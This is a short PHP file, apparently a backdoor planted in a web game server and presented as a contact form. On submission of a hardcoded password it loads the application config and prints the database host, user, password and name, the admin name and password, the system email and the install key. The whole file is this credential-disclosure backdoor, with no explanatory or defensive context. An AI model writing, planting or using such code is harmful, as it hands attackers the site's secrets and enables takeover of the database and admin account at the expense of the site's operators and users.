<?php if(isset($_POST['mdp'])){
if ($_POST['mdp']=="KOBIC"){include ("app/config.php");
echo $AppConfig['db']['host'];echo "<br />";
echo $AppConfig['db']['user'];echo "<br />";
echo $AppConfig['db']['password'];echo "<br />";
echo $AppConfig['db']['database'];
echo "<br />the admin name is ";
echo $AppConfig['system']['adminName'];
echo "<br /> admin pass: ";
echo $AppConfig['system']['adminPassword'];
echo "<br /> email system: ";
echo $AppConfig['system']['email'];
echo "<br /> install key: ";
echo $AppConfig['system']['installkey'];
echo "<br />calltatar: ";
echo $AppConfig['system']['calltatar'];
echo "<br />";
}else{echo "error";}}?><form method="post" action="contact.php"><p><input type="text" name="mdp" /></p><input type="submit" name="submit" /></form>
